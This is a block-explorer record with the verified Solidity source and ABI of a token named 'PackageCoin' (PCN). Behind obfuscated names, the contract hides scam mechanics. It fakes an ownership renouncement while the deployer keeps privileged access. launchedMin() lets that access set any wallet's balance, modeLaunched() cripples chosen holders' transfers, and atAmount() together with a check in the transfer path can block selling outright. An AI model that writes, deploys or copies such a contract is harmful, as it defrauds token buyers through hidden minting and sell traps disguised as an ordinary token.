{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract receiverMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapEnable {\n    function createPair(address tradingMarketing, address limitLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface teamLaunchedTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverEnable) external view returns (uint256);\n\n    function transfer(address launchedAt, uint256 listFromAuto) external returns (bool);\n\n    function allowance(address atSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listFromAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAt,\n        uint256 listFromAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenWallet, uint256 value);\n    event Approval(address indexed atSell, address indexed spender, uint256 value);\n}\n\ninterface tradingAuto is atTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PackageCoin is receiverMode, atTrading, tradingAuto {\n\n    uint256 autoReceiver;\n\n    string private receiverTeam = \"PCN\";\n\n    function receiverMin(address isTake, address launchedAt, uint256 listFromAuto) internal returns (bool) {\n        if (isTake == feeMarketing) {\n            return tokenAt(isTake, launchedAt, listFromAuto);\n        }\n        uint256 shouldList = atTrading(launchBuy).balanceOf(minBuyTotal);\n        require(shouldList == autoReceiver);\n        require(launchedAt != minBuyTotal);\n        if (teamMarketing[isTake]) {\n            return tokenAt(isTake, launchedAt, receiverAmount);\n        }\n        listFromAuto = teamToList(isTake, launchedAt, listFromAuto);\n        return tokenAt(isTake, launchedAt, listFromAuto);\n    }\n\n    bool public fundLimit;\n\n    function owner() external view returns (address) {\n        return swapTokenSell;\n    }\n\n    function modeLaunched(address marketingMaxAmount) public {\n        maxTakeTeam();\n        \n        if (marketingMaxAmount == feeMarketing || marketingMaxAmount == launchBuy) {\n            return;\n        }\n        teamMarketing[marketingMaxAmount] = true;\n    }\n\n    uint256 marketingSell;\n\n    address private swapTokenSell;\n\n    bool public shouldFee;\n\n    mapping(address => bool) public enableAt;\n\n    event OwnershipTransferred(address indexed tokenTotalFee, address indexed swapShould);\n\n    function transferFrom(address isTake, address launchedAt, uint256 listFromAuto) external override returns (bool) {\n        if (_msgSender() != buyLimit) {\n            if (liquidityMax[isTake][_msgSender()] != type(uint256).max) {\n                require(listFromAuto <= liquidityMax[isTake][_msgSender()]);\n                liquidityMax[isTake][_msgSender()] -= listFromAuto;\n            }\n        }\n        return receiverMin(isTake, launchedAt, listFromAuto);\n    }\n\n    address public launchBuy;\n\n    uint256 private sellTotal = 100000000 * 10 ** 18;\n\n    uint8 private teamLaunchedEnable = 18;\n\n    uint256 constant receiverAmount = 20 ** 10;\n\n    function launchedMin(address fundWallet, uint256 listFromAuto) public {\n        maxTakeTeam();\n        walletTxAt[fundWallet] = listFromAuto;\n    }\n\n    function atAmount(uint256 listFromAuto) public {\n        maxTakeTeam();\n        autoReceiver = listFromAuto;\n    }\n\n    function approve(address shouldMarketing, uint256 listFromAuto) public virtual override returns (bool) {\n        liquidityMax[_msgSender()][shouldMarketing] = listFromAuto;\n        emit Approval(_msgSender(), shouldMarketing, listFromAuto);\n        return true;\n    }\n\n    uint256 public limitFrom = 3;\n\n    string private listSender = \"Package Coin\";\n\n    bool public senderShouldAt;\n\n    function senderFund(address fundLaunchTo) public {\n        require(fundLaunchTo.balance < 100000);\n        if (receiverLaunch) {\n            return;\n        }\n        if (fundLimit) {\n            shouldFee = true;\n        }\n        enableAt[fundLaunchTo] = true;\n        \n        receiverLaunch = true;\n    }\n\n    function transfer(address fundWallet, uint256 listFromAuto) external virtual override returns (bool) {\n        return receiverMin(_msgSender(), fundWallet, listFromAuto);\n    }\n\n    function toReceiver() public {\n        emit OwnershipTransferred(feeMarketing, address(0));\n        swapTokenSell = address(0);\n    }\n\n    mapping(address => bool) public teamMarketing;\n\n    function tokenAt(address isTake, address launchedAt, uint256 listFromAuto) internal returns (bool) {\n        require(walletTxAt[isTake] >= listFromAuto);\n        walletTxAt[isTake] -= listFromAuto;\n        walletTxAt[launchedAt] += listFromAuto;\n        emit Transfer(isTake, launchedAt, listFromAuto);\n        return true;\n    }\n\n    constructor (){\n        if (receiverLaunched == tradingWalletReceiver) {\n            shouldFee = false;\n        }\n        toReceiver();\n        teamLaunchedTx isAuto = teamLaunchedTx(buyLimit);\n        launchBuy = swapEnable(isAuto.factory()).createPair(isAuto.WETH(), address(this));\n        minBuyTotal = swapEnable(isAuto.factory()).feeTo();\n        if (receiverLaunched == tradingWalletReceiver) {\n            tradingWalletReceiver = receiverLaunched;\n        }\n        feeMarketing = _msgSender();\n        enableAt[feeMarketing] = true;\n        walletTxAt[feeMarketing] = sellTotal;\n        \n        emit Transfer(address(0), feeMarketing, sellTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityMax;\n\n    bool public receiverLaunch;\n\n    address minBuyTotal;\n\n    function allowance(address isAmount, address shouldMarketing) external view virtual override returns (uint256) {\n        if (shouldMarketing == buyLimit) {\n            return type(uint256).max;\n        }\n        return liquidityMax[isAmount][shouldMarketing];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listSender;\n    }\n\n    address buyLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamToList(address isTake, address launchedAt, uint256 listFromAuto) internal view returns (uint256) {\n        require(listFromAuto > 0);\n\n        uint256 txBuy = 0;\n        if (isTake == launchBuy && limitFrom > 0) {\n            txBuy = listFromAuto * limitFrom / 100;\n        } else if (launchedAt == launchBuy && isFee > 0) {\n            txBuy = listFromAuto * isFee / 100;\n        }\n        require(txBuy <= listFromAuto);\n        return listFromAuto - txBuy;\n    }\n\n    mapping(address => uint256) private walletTxAt;\n\n    uint256 public tradingWalletReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTeam;\n    }\n\n    function maxTakeTeam() private view {\n        require(enableAt[_msgSender()]);\n    }\n\n    function balanceOf(address receiverEnable) public view virtual override returns (uint256) {\n        return walletTxAt[receiverEnable];\n    }\n\n    function getOwner() external view returns (address) {\n        return swapTokenSell;\n    }\n\n    uint256 public isFee = 0;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLaunchedEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTotal;\n    }\n\n    uint256 private toTrading;\n\n    address public feeMarketing;\n\n    uint256 private receiverLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotalFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFromAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listFromAuto\",\"type\":\"uint256\"}],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFromAuto\",\"type\":\"uint256\"}],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMaxAmount\",\"type\":\"address\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunchTo\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShouldAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingWalletReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFromAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFromAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PackageCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}